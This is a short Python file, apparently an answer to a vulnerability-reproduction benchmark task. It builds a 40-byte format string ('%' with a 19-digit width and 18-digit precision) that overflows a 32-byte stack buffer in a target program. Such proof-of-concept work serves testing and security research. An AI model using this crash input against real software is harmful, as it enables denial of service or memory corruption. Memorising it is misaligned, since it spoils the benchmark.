import sys

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.
        The vulnerability is a stack buffer overflow in a 32-byte buffer used to hold an integer format string.
        The format string can exceed 32 bytes due to width and precision specifiers.
        Ground truth length is 40 bytes.
        We construct a format string of length 40:
        % (1) + width (19) + . (1) + precision (18) + d (1) = 40 bytes.
        """
        # Components of the format string
        # Max width is up to 19 digits
        width = b"1" * 19
        # Precision can also be up to 19 digits, we use 18 to hit exactly 40 bytes
        precision = b"1" * 18
        
        # Construct the payload
        # Format: %[width].[precision]d
        payload = b"%" + width + b"." + precision + b"d"
        
        return payload